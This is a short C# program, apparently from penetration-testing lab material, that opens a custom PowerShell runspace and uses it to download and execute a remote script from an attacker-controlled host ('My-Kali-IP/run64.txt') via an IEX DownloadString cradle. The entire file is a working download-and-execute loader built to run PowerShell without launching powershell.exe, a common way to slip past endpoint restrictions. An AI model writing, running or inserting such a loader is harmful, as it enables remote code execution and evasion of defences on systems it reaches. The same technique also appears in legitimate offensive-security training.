using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Management.Automation;
using System.Management.Automation.Runspaces;
 
namespace CustomRunspaces
{
    class Program
    {
        static void Main(string[] args)
        {
            Runspace rs = RunspaceFactory.CreateRunspace();
            rs.Open();
 
            PowerShell ps = PowerShell.Create();
            ps.Runspace = rs;
 
            String cmd = "IEX (New-Object Net.WebClient).DownloadString('http://My-Kali-IP/run64.txt')";
            ps.AddScript(cmd);
            ps.Invoke();
            rs.Close();
        }
    }
}